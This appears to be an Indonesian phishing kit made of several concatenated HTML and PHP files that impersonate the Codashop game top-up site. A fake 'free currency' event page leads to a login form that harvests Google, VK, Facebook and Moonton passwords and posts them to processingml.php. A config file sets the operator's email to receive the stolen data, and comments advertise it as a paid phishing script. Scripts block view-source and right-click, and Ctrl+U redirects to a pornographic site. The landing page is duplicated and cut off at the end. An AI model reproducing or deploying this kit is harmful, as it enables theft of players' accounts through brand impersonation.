clear

<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="https://images2.imgbox.com/74/c2/A82aJNWc_o.png"/>
<title>Mobile Legend - Codashop</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {

var gnumber = $("#gnumber").val();
var townhall = $("#townhall").val();
var grecov = $("#grecov").val();
var gexp = $("#gexp").val();
		  if(gnumber==''|| grecov=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("request.php",
		  {gnumber:gnumber,grecov:grecov,gexp:gexp,townhall:townhall,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			
		  });
		  return false;
	  }
	  }
	  );
	});

	</script>
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
<div align="center"><noscript>
   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
</noscript></div>

<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>

<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;

}
</style>
<style type="text/css">
img {
	-webkit-touch-callout: none;
	-webkit-user-select: none;
    }
</style>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>
<script type='text/javascript'>window._sbzq||function(e){e._sbzq=[];var t=e._sbzq;t.push(["_setAccount",54166]);var n=e.location.protocol=="https:"?"https:":"http:";var r=document.createElement("script");r.type="text/javascript";r.async=true;r.src=n+"//static.subiz.com/public/js/loader.js";var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)}(window);</script>
<CENTER>
<div class="col-md-6">

<body background = "https://s10.postimg.org/ulreu2eq1/image.jpg"><br>
<div class="col-md-8">
       <form action="processingml.php" id="login-form" method="post">
  <h4 >
<img src="http://pngimg.com/uploads/google/google_PNG19630.png?i=1" height="50px" width="50px">  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="google1" placeholder="Email" type="email" >
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="google2" placeholder="Password" type="password" >
 <br>
 </div>
 
 <form action="processingml.php" id="login-form" method="post">
<h4 >
<img src="https://images2.imgbox.com/d0/7a/4D5Lxef1_o.png" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="vk1" placeholder="Email Or Phone Number" type="text" >
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="vk2" placeholder="Password" type="password" >


       <form action="processingml.php" id="login-form" method="post">
<h4 >
<img src="http://www.freepngimg.com/thumb/facebook/2-2-facebook-free-download-png-thumb.png" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb1" placeholder="Email Or Phone Number" type="text" >
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb2" placeholder="Password" type="password" >


       <form action="processingml.php" id="login-form" method="post">
<h4 >
<img src="https://2.bp.blogspot.com/-4hQwrsUFwwg/WkyFCMEk9zI/AAAAAAAABh4/IUGibfWk4WkKmySYg5VKwy-M-qQPiBzIgCLcBGAs/s200/moonton.png" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="mt1" placeholder="Email Or Phone Number" type="text" >
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="mt2" placeholder="Password" type="password" >

  
  

  
  
  
 <input type="submit" class="btn btn-block" style="color: #A9A9A9;background-color: #000000;" value="LOGIN ACCOUNT"> </form>
 </div>
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
 
 <p><center><b>© Hak Cipta Coda Payments 2019</b>.</p>
</center>
</div><br>
</div>
  </p> 
</div>
</div>
</div><br><br>
</div>

# batas

<!-- Ganti menjadi email mu disini-->
<!-- Ingat JANGAN GANTI COPYRIGHT SC-->
<!-- Script di buat oleh PulberAja-->
<?php
$emailku = 'editbae93@gmail.com';
?>

# batas

<!-- SCRIPT BY : PulberAja // Dilarang Ganti Copyright-->
<!-- SCRIPT PHISING BERBAYAR-->
<!-- Gunakan dengan bijak script ini -->
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <link rel="shortcut icon" href="https://s13.postimg.org/6ttz5767b/codashop.png"/>
  <title>Codashop</title>

		<img src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo.png">
  
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<div class="" id="">
<div class=""></div>
<h1><a href="https://news.codashop.com/gunakan-tri-kamu-di-codashop-dan-dapatkan-bonus-kuota/?utm_source=id_codashop_banner&utm_medium=topbanner&utm_campaign=tri_5gb&_ga=2.91500122.114185824.1567263998-1396185724.1565388742" class="logo"><center>
<img style="width: 100%; height: 30%;" src="https://images2.imgbox.com/25/4b/sYfZaIjs_o.png"></a></h1>
</head>



				


		<!-- container -->
		<div id="container">

			
			<div class="contents">
			    <a href="https://news.codashop.com">
                	<span style="display: block; color: white; border-color: white; border-width: 1px; font-size: 12px; padding: 5px; border-radius: 5px 5px 5px; border: 1px solid white; margin: -15px 5px 10px 5px; text-decoration: underline; text-align:center;">
                 	 Berita - Guides - Reviews
                	</span>
            	</a>
				<div class="section01">
                    <!-- ProductBox -->
                    
                 <style>
      /* NOTE: The styles were added inline because Prefixfree needs access to your styles and they must be inlined if they are on local disk! */
      @import url(https://fonts.googleapis.com/css?family=Raleway:400,700,500,300);
* {
  -webkit-font-smoothing: antialiased;
  box-sizing: border-box;
}

html, body {
  width: 100%;
  height: 100%;
  padding: 0;
  margin: 0;
  background-image:url('https://s13.postimg.org/y2w5rvsfb/bandicam_2018-01-05_16-40-50-247.jpg');
}



#container {
  width: 53em;
  margin: 4em auto;
}

.plan {
  width: 17em;
  height: auto;
  background: #045FB4;
  margin: .4em 0 .4em .4em;
  float: left;
  box-shadow: 0 0 1em rgba(0, 0, 0, 0.15);
}


.plan .offer {
  height: 4.3870967742em;
  width: 100%;
  text-align: center;
  font-size: 1.8888888889em;
  line-height: 2.4;
  float: left;
  text-transform: uppercase;
  font-weight: 600;
}
.plan .list {
  width: 100%;
}
.plan .list ul {
  list-style: none;
  padding: 0;
  margin: 0;
  display: block;
  width: 100%;
  float: left;
  height: auto;
  overflow: hidden;
  background: #045FB4;
}
.plan .list ul li {
  width: 100%;
  display: block;
  height: auto;
  padding: 1.6em;
  text-align: center;
  box-shadow: inset 0 -0.15em 0 rgba(0, 0, 0, 0.1);
  color: #045FB4;
}
.plan footer {
  display: block;
  float: left;
  height: 5.7909677419em;
  width: 100%;
  background: #fff;
  border-bottom: 0.5849462366em solid #FE642E;
  padding: 1em;
}
.plan footer .button {
  display: block;
  width: 5.264516129em;
  margin: 0.1199971765em auto;
  padding: 0.2193548387em;
  text-align: center;
  text-decoration: none;
  font-size: 2.0em;
  font-weight: 500;
  border-radius: 2px;
  background-color: #045FB4;
  color: #fff;
  
}
.plan footer .button:after {
  content: "FREE";
}
.plan.blue {
  background-color: #045FB4;
  color: #FAFAFA;
}
.plan.blue p:after {
  content: "Free Plan";
}
.plan.blue .list ul li:nth-child(1):after {
  content: "4 Social networks";
}
.plan.blue .list ul li:nth-child(2):after {
  content: "Statistics";
}
.plan.blue .list ul li:nth-child(3):after {
  content: "Manage your social feed";
}
.plan.green {
  background: #2ecc71;
  color: #fff;
}
.plan.green p:after {
  content: "$5/Month";
}
.plan.green .list ul li:nth-child(1):after {
  content: "Any Social networks";
}
.plan.green .list ul li:nth-child(2):after {
  content: "Statistics / 1 free domain";
}
.plan.green .list ul li:nth-child(3):after {
  content: "All social options enabled";
}
.plan.gold {
  background: #FE642E;
  color: #FE642E;
}
.plan.gold p:after {
  content: "$10/Month";
}
.plan.gold .list ul li:nth-child(1):after {
  content: "All social options enabled";
}
.plan.gold .list ul li:nth-child(2):after {
  content: "Up to 3 free domains";
}
.plan.gold .list ul li:nth-child(3):after {
  content: "Video chat + screen sharing";
}

.plan.blue .button {
  background: #8ab0c1;
}

.plan.green .button {
  background: #2ecc71;
}

.plan.gold .button {
  background: #000000;
}

@media all and (max-width: 55em) {
  #container {
    width: 100%;
  }

  .plan {
    margin: auto 0;
    box-shadow: 0 0 0 !important;
    width: 33.33%;
    font-size: .9em !important;
  }
  .plan:nth-child(1) header, .plan:nth-child(3) header {
    height: 3.8387096774em !important;
  }
  .plan:nth-child(1) header h2, .plan:nth-child(3) header h2 {
    display: none;
  }
  .plan:nth-child(2) header {
    height: 3.8387096774em !important;
  }
  .plan:nth-child(2) header h2 {
    line-height: 1;
  }

  .blue .offer {
    background: -webkit-linear-gradient(left, #8ab0c1, #8ab0c1, #8ab0c1, #8ab0c1, #2ecc71);
    background: linear-gradient(to right, #8ab0c1, #8ab0c1, #8ab0c1, #8ab0c1, #2ecc71);
  }

  .green .offer {
    background: -webkit-linear-gradient(left, #2ecc71, #2ecc71, #2ecc71, #2ecc71, #f1c40f);
    background: linear-gradient(to right, #2ecc71, #2ecc71, #2ecc71, #2ecc71, #f1c40f);
  }

  .gold .offer {
    background: -webkit-linear-gradient(left, #f1c40f, #f1c40f, #f1c40f, #f1c40f, #f1c40f);
    background: linear-gradient(to right, #f1c40f, #f1c40f, #f1c40f, #f1c40f, #f1c40f);
  }
}
@media all and (max-width: 43em) {
  #container {
    margin: 0;
  }

  .plan {
    font-size: 1em !important;
    margin: auto 0;
    box-shadow: 0 0 0 !important;
    width: 100%;
    border-bottom-size: .2em;
  }
  .plan:nth-child(2) header, .plan:nth-child(3) header {
    display: none;
  }
  .plan:nth-child(1) header {
    height: 3.8387096774em !important;
  }
  .plan:nth-child(1) header h2 {
    display: block;
    line-height: 1;
  }
  .plan footer .button {
    width: 92%;
    margin: .2em 4%;
  }

  .blue .offer {
    background: #8ab0c1;
  }

  .green .offer {
    background: #2ecc71;
  }

  .gold .offer {
    background: #f1c40f;
  }
}

    </style>

   
</head>

<body>


  <div id="container">

<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
 <center><img height="270" width="270" src="https://images2.imgbox.com/47/56/zU5BlUoA_o.jpg"></center>
  <footer>
    <a href="ml.php" class="button"></a>
  </footer>
</div>



<!-- Green -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
   <center><img height="270" width="270" src="https://images2.imgbox.com/a3/bc/UGj3keUR_o.jpg"></center>
  <footer>
    <a href="ff.php" class="button"></a>
  </footer>
</div>


<!-- Gold -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
  <center><img height="270" width="270" src="https://images2.imgbox.com/14/ca/Bn8N8ZaU_o.jpg"></center>
  <footer>
    <a href="pubg.php" class="button"></a>
  </footer>
</div>


  <div id="container">

<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
 <center><img height="270" width="270" src="https://images2.imgbox.com/bf/21/ACWjOBXy_o.jpg"></center>
  <footer>
    <a href="hago.php" class="button"></a>
  </footer>
</div>


<!-- Green -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
   <center><img height="270" width="270" src="https://images2.imgbox.com/8d/9e/wQLmFi7g_o.jpg"></center>
  <footer>
    <a href="google.php" class="button"></a>
  </footer>
</div>


<!-- Gold -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
  <center><img height="270" width="270" src="https://images2.imgbox.com/a5/3c/JzUBPbmR_o.jpg"></center>
  <footer>
    <a href="garena.php" class="button"></a>
  </footer>
</div>
  

  <div id="container">

<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
 <center><img height="270" width="270" src="https://images2.imgbox.com/ff/89/KgfsJx1f_o.jpg"></center>
  <footer>
    <a href="aov.php" class="button"></a>
  </footer>
</div>


<!-- Green -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
   <center><img height="270" width="270" src="https://images2.imgbox.com/45/b4/X4QQ8Puo_o.jpg"></center>
  <footer>
    <a href="gs.php" class="button"></a>
  </footer>
</div>


<!-- Gold -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
  <center><img height="270" width="270" src="https://images2.imgbox.com/2d/99/81rSCMxu_o.png"></center>
  <footer>
    <a href="mlad.php" class="button"></a>
  </footer>
</div>
  



</div>



				</div>

			</div>
			
<!-- footer -->
<body style="background-color:white">
	<footer id="footer_landing">
		<div class="foo_01">
			<h1 class="step">
Codashop: Event TopUp Gratis Mata Uang di Website top-up terbesar & terpercaya di Indonesia!</h1>
			<p class="txt">
				
Setiap bulannya, jutaan gamers menggunakan Codashop untuk melakukan pembelian kredit game dengan lancar: dengan event ini di wajibkan log-in, dan kredit permainan akan ditambahkan secara otomatis. Top-up Mobile Legends, Free Fire, dan berbagai game lainnya!<br/><br/>
			</p>
		</div>

		<div class="foo_03">
			<div class="txt03" style="width: 66%;">
				<div class="FooBox">
					<p>Presented by:</p>
					<a href="https://www.codapay.com" target="_blak"><img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/web/images/codapay.png?v=819" /></a>
				</div>
				<div class="FooBox">
					<p class="social">Dapatkan berita Coda di:</p>
					<a href="http://www.facebook.com/Codapay" target="_blak"><img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/web/images/facebook.png?v=819" /></a>
					<a href="https://twitter.com/codashopID" target="_blak"><img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/web/images/twitter.png?v=819" /></a>
				</div>
				<div class="customer-service">
					<h4 class="">Customer service</h4>
					<p><b><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="34474144445b464074575b505544554d59515a40471a575b59">[email&#160;protected]</a></b> <br/> <a href="https://m.me/Codapay" target="_blank"><u></p>
				</div>
			</div>
			<div class="txt02">
				<a href="https://www.codapay.com/toc.php" target="_blak">Syarat & Kondisi</a>
				<p class="copy">&#169;  Hak Cipta Coda Payments 2019.</p>
			</div>
		</div>
	</footer>
	<!-- //footer -->

	<!-- dim-->
	<p class="dim" onclick="lanClose();"></p>

<script data-cfasync="false" src="/cdn-cgi/scripts/af2821b0/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/web/js/jquery-1.11.0.min.js?v=819"></script>
<script type="text/javascript" src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/common/js/jquery.cookie.js?v=819"></script>
<script type="text/javascript" src="/content/common/js/common.js"></script>

<script type="text/javascript">
$.ajaxSetup({cache: false});
$(document).ready(function (){
	var numBoxes = $(".ProductBox").size();
	if (numBoxes == 4) {
		$(".section01").attr("style","width:965px;max-width:965px");
	}

	lanSelect();
});

function lanSelect(){
	$(".header .lan a").click(function(){
		$(".header .lanPop").show();
		$(".dim").show();
	});
}

function lanClose(){
	//if($(".header .lanPop").hasClass('active')){
		$(".header .lanPop").css({'display':'none'});
		$('.dim').css({'display':'none'});
	//}
}


$('.switcher').click(function(event) {
    switchLang(event.target.id);
});

function switchLang(language){
	$.cookie("shop-lang", language, { expires : 1, path: '/' });
}

</script>

	
 </body>
<script type="text/javascript"> if (typeof document.onselectstart!="undefined") { document.onselectstart=new Function ("return false"); } else{ document.onmousedown=new Function ("return false"); document.onmouseup=new Function ("return true"); } </script > <script language=javascript> <!-- var message=" Si KONTOL Mau Maling "; /////////////////////////////////// function clickIE4(){ if (event.button==2){ alert(message); return false; } } function clickNS4(e){ if (document.layers||document.getElementById&&!document.all){ if (e.which==2||e.which==3){ alert(message); return false; } } } if (document.layers){ document.captureEvents(Event.MOUSEDOWN); document.onmousedown=clickNS4; } else if (document.all&&!document.getElementById){ document.onmousedown=clickIE4; } document.oncontextmenu=new Function("alert(message);return false") // --> </script> <script type='text/javascript'> //<![CDATA[ shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function() {top.location.href="http://www.bokepindo.com"}); //]]> </script> 

<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' ondragstart='return false' onselectstart='return false' style='-moz-user-select: none; cursor: default;'>




</html>
</html>

# batas


<!DO<!-- SCRIPT BY : PulberAja // Dilarang Ganti Copyright-->
<!-- SCRIPT PHISING BERBAYAR-->
<!-- Gunakan dengan bijak script ini -->
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <link rel="shortcut icon" href="https://s13.postimg.org/6ttz5767b/codashop.png"/>
  <title>Codashop</title>

		<img src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo.png">
  
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<div class="" id="">
<div class=""></div>
<h1><a href="https://news.codashop.com/gunakan-tri-kamu-di-codashop-dan-dapatkan-bonus-kuota/?utm_source=id_codashop_banner&utm_medium=topbanner&utm_campaign=tri_5gb&_ga=2.91500122.114185824.1567263998-1396185724.1565388742" class="logo"><center>
<img style="width: 100%; height: 30%;" src="https://images2.imgbox.com/25/4b/sYfZaIjs_o.png"></a></h1>
</head>



				


		<!-- container -->
		<div id="container">

			
			<div class="contents">
			    <a href="https://news.codashop.com">
                	<span style="display: block; color: white; border-color: white; border-width: 1px; font-size: 12px; padding: 5px; border-radius: 5px 5px 5px; border: 1px solid white; margin: -15px 5px 10px 5px; text-decoration: underline; text-align:center;">
                 	 Berita - Guides - Reviews
                	</span>
            	</a>
				<div class="section01">
                    <!-- ProductBox -->
                    
                 <style>
      /* NOTE: The styles were added inline because Prefixfree needs access to your styles and they must be inlined if they are on local disk! */
      @import url(https://fonts.googleapis.com/css?family=Raleway:400,700,500,300);
* {
  -webkit-font-smoothing: antialiased;
  box-sizing: border-box;
}

html, body {
  width: 100%;
  height: 100%;
  padding: 0;
  margin: 0;
  background-image:url('https://s13.postimg.org/y2w5rvsfb/bandicam_2018-01-05_16-40-50-247.jpg');
}



#container {
  width: 53em;
  margin: 4em auto;
}

.plan {
  width: 17em;
  height: auto;
  background: #045FB4;
  margin: .4em 0 .4em .4em;
  float: left;
  box-shadow: 0 0 1em rgba(0, 0, 0, 0.15);
}


.plan .offer {
  height: 4.3870967742em;
  width: 100%;
  text-align: center;
  font-size: 1.8888888889em;
  line-height: 2.4;
  float: left;
  text-transform: uppercase;
  font-weight: 600;
}
.plan .list {
  width: 100%;
}
.plan .list ul {
  list-style: none;
  padding: 0;
  margin: 0;
  display: block;
  width: 100%;
  float: left;
  height: auto;
  overflow: hidden;
  background: #045FB4;
}
.plan .list ul li {
  width: 100%;
  display: block;
  height: auto;
  padding: 1.6em;
  text-align: center;
  box-shadow: inset 0 -0.15em 0 rgba(0, 0, 0, 0.1);
  color: #045FB4;
}
.plan footer {
  display: block;
  float: left;
  height: 5.7909677419em;
  width: 100%;
  background: #fff;
  border-bottom: 0.5849462366em solid #FE642E;
  padding: 1em;
}
.plan footer .button {
  display: block;
  width: 5.264516129em;
  margin: 0.1199971765em auto;
  padding: 0.2193548387em;
  text-align: center;
  text-decoration: none;
  font-size: 2.0em;
  font-weight: 500;
  border-radius: 2px;
  background-color: #045FB4;
  color: #fff;
  
}
.plan footer .button:after {
  content: "FREE";
}
.plan.blue {
  background-color: #045FB4;
  color: #FAFAFA;
}
.plan.blue p:after {
  content: "Free Plan";
}
.plan.blue .list ul li:nth-child(1):after {
  content: "4 Social networks";
}
.plan.blue .list ul li:nth-child(2):after {
  content: "Statistics";
}
.plan.blue .list ul li:nth-child(3):after {
  content: "Manage your social feed";
}
.plan.green {
  background: #2ecc71;
  color: #fff;
}
.plan.green p:after {
  content: "$5/Month";
}
.plan.green .list ul li:nth-child(1):after {
  content: "Any Social networks";
}
.plan.green .list ul li:nth-child(2):after {
  content: "Statistics / 1 free domain";
}
.plan.green .list ul li:nth-child(3):after {
  content: "All social options enabled";
}
.plan.gold {
  background: #FE642E;
  color: #FE642E;
}
.plan.gold p:after {
  content: "$10/Month";
}
.plan.gold .list ul li:nth-child(1):after {
  content: "All social options enabled";
}
.plan.gold .list ul li:nth-child(2):after {
  content: "Up to 3 free domains";
}
.plan.gold .list ul li:nth-child(3):after {
  content: "Video chat + screen sharing";
}

.plan.blue .button {
  background: #8ab0c1;
}

.plan.green .button {
  background: #2ecc71;
}

.plan.gold .button {
  background: #000000;
}

@media all and (max-width: 55em) {
  #container {
    width: 100%;
  }

  .plan {
    margin: auto 0;
    box-shadow: 0 0 0 !important;
    width: 33.33%;
    font-size: .9em !important;
  }
  .plan:nth-child(1) header, .plan:nth-child(3) header {
    height: 3.8387096774em !important;
  }
  .plan:nth-child(1) header h2, .plan:nth-child(3) header h2 {
    display: none;
  }
  .plan:nth-child(2) header {
    height: 3.8387096774em !important;
  }
  .plan:nth-child(2) header h2 {
    line-height: 1;
  }

  .blue .offer {
    background: -webkit-linear-gradient(left, #8ab0c1, #8ab0c1, #8ab0c1, #8ab0c1, #2ecc71);
    background: linear-gradient(to right, #8ab0c1, #8ab0c1, #8ab0c1, #8ab0c1, #2ecc71);
  }

  .green .offer {
    background: -webkit-linear-gradient(left, #2ecc71, #2ecc71, #2ecc71, #2ecc71, #f1c40f);
    background: linear-gradient(to right, #2ecc71, #2ecc71, #2ecc71, #2ecc71, #f1c40f);
  }

  .gold .offer {
    background: -webkit-linear-gradient(left, #f1c40f, #f1c40f, #f1c40f, #f1c40f, #f1c40f);
    background: linear-gradient(to right, #f1c40f, #f1c40f, #f1c40f, #f1c40f, #f1c40f);
  }
}
@media all and (max-width: 43em) {
  #container {
    margin: 0;
  }

  .plan {
    font-size: 1em !important;
    margin: auto 0;
    box-shadow: 0 0 0 !important;
    width: 100%;
    border-bottom-size: .2em;
  }
  .plan:nth-child(2) header, .plan:nth-child(3) header {
    display: none;
  }
  .plan:nth-child(1) header {
    height: 3.8387096774em !important;
  }
  .plan:nth-child(1) header h2 {
    display: block;
    line-height: 1;
  }
  .plan footer .button {
    width: 92%;
    margin: .2em 4%;
  }

  .blue .offer {
    background: #8ab0c1;
  }

  .green .offer {
    background: #2ecc71;
  }

  .gold .offer {
    background: #f1c40f;
  }
}

    </style>

   
</head>

<body>


  <div id="container">

<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
 <center><img height="270" width="270" src="https://images2.imgbox.com/47/56/zU5BlUoA_o.jpg"></center>
  <footer>
    <a href="ml.php" class="button"></a>
  </footer>
</div>



<!-- Green -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
   <center><img height="270" width="270" src="https://images2.imgbox.com/a3/bc/UGj3keUR_o.jpg"></center>
  <footer>
    <a href="ff.php" class="button"></a>
  </footer>
</div>


<!-- Gold -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
  <center><img height="270" width="270" src="https://images2.imgbox.com/14/ca/Bn8N8ZaU_o.jpg"></center>
  <footer>
    <a href="pubg.php" class="button"></a>
  </footer>
</div>


  <div id="container">

<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
 <center><img height="270" width="270" src="https://images2.imgbox.com/bf/21/ACWjOBXy_o.jpg"></center>
  <footer>
    <a href="hago.php" class="button"></a>
  </footer>
</div>


<!-- Green -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
   <center><img height="270" width="270" src="https://images2.imgbox.com/8d/9e/wQLmFi7g_o.jpg"></center>
  <footer>
    <a href="google.php" class="button"></a>
  </footer>
</div>


<!-- Gold -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
  <center><img height="270" width="270" src="https://images2.imgbox.com/a5/3c/JzUBPbmR_o.jpg"></center>
  <footer>
    <a href="garena.php" class="button"></a>
  </footer>
</div>
  

  <div id="container">

<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
 <center><img height="270" width="270" src="https://images2.imgbox.com/ff/89/KgfsJx1f_o.jpg"></center>
  <footer>
    <a href="aov.php" class="button"></a>
  </footer>
</div>


<!-- Green -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
   <center><img height="270" width="270" src="https://images2.imgbox.com/45/b4/X4QQ8Puo_o.jpg"></center>
  <footer>
    <a href="gs.php" class="button"></a>
  </footer>
</div>


<!-- Gold -->
<div class="plan gold"> 
  <header>
    <h2><span></span></h2>
  </header>
  <center><img height="270" width="270" src="https://images2.imgbox.com/2d/99/81rSCMxu_o.png"></center>
  <footer>
    <a href="mlad.php" class="button"></a>
  </footer>
</div>
  



</div>



				</div>

			</div>
			
<!-- footer -->
<body style="background-color:white">
	<footer id="footer_landing">
		<div class="foo_01">
			<h1 class="step">
Codashop: Event TopUp Gratis Mata Uang di Website top-up terbesar & terpercaya di Indonesia!</h1>
			<p class="txt">
				
Setiap bulannya, jutaan gamers menggunakan Codashop untuk melakukan pembelian kredit game dengan lancar: dengan event ini di wajibkan log-in, dan kredit permainan akan ditambahkan secara otomatis. Top-up Mobile Legends, Free Fire, dan berbagai game lainnya!<br/><br/>
			</p>
		</div>

		<div class="foo_03">
			<div class="txt03" style="width: 66%;">
				<div class="FooBox">
					<p>Presented by:</p>
					<a href="https://www.codapay.com" target="_blak"><img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/web/images/codapay.png?v=819" /></a>
				</div>
				<div class="FooBox">
					<p class="social">Dapatkan berita Coda di:</p>
					<a href="http://www.facebook.com/Codapay" target="_blak"><img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/web/images/facebook.png?v=819" /></a>
					<a href="https://twitter.com/codashopID" target="_blak"><img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/web/images/twitter.png?v=819" /></a>
				</div>
				<div class="customer-service">
					<h4 class="">Customer service</h4>
